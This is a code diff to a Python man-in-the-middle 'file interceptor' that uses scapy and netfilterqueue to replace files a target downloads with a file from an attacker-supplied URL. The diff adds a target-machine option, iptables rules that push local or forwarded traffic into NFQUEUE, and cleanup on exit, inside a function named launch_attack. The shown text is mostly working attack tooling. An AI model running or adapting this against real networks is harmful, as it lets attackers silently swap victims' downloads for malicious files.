@@ -6,14 +6,23 @@ import netfilterqueue
 import scapy.all as scapy
 from termcolor import colored
 import argparse
+import os
+import sys
 
 seq_list = []
 
 def get_argurments():
     parse = argparse.ArgumentParser()
-    parse.add_argument("-f", "--filetype", dest="filetype", help="Filetype of the Original Download")
-    parse.add_argument("-u", "--url", dest="url", help="Download Link for Alternative File" )
+    parse.add_argument("-f", "--filetype", dest="filetype", help="Filetype of the File to be Replaced")
+    parse.add_argument("-u", "--url", dest="url", help="URL for Replacement File. (Full URL)" )
+    parse.add_argument("-m", "--machine", dest="machine", help="Machine to run the Attack on. (remote or local)")
     args = parse.parse_args()
+    if not args.filetype:
+        parse.error(colored("[-] TargetFileType not Specified. Use -h to display Help.", "yellow"))
+    if not args.url:
+        parse.error(colored("[-] Replacement File URL not Specified. Use -h to display Help.", "yellow"))
+    if not args.machine:
+        parse.error(colored("[-] Target Machine not Specified. Use -h to display Help.", "yellow"))
     return args
 
 def process_queue():
@@ -29,7 +38,6 @@ def set_packet_load(packet, load):
     return packet
 
 def process_packets(packet):
-    get_argurments()
     args = get_argurments()
     scapy_packet = scapy.IP(packet.get_payload()) # To convert the Raw packets into scapy packets.
     if scapy_packet.haslayer(scapy.Raw):          # Checking for Raw Layer which contains the useful Data.
@@ -51,10 +59,22 @@ def process_packets(packet):
     packet.accept()                               # Forwarding the Packets.
 
 def launch_attack():
-    print(colored("[+] File Interceptor running... Make sure you specified the FileType (-f) and Replacement File URL (-u) ", "green"))
+    args = get_argurments()
+    if args.machine == "local":
+        os.system('iptables -I OUTPUT -j NFQUEUE --queue-num 0')
+        os.system('iptables -I INPUT -j NFQUEUE --queue-num 0')
+    elif args.machine == "remote":
+        os.system('iptables -I FORWARD -j NFQUEUE --queue-num 0')
+    else:
+        print(colored("[-] Machine Unrecognised.", "yellow"))
+        sys.exit()
+    print(colored("[+] File Interceptor running... Make sure you specified the FileType (-f), Replacement File URL (-u) and Target Machine (-m).", "green"))
     try:
         process_queue()
     except KeyboardInterrupt:
         print(colored("[-] Ctrl-C Detected... Quitting..", "yellow"))
+        os.system('iptables --flush')
+        print(colored("[+] Restored IPTables.", "yellow"))
+        sys.exit()
 
 launch_attack()
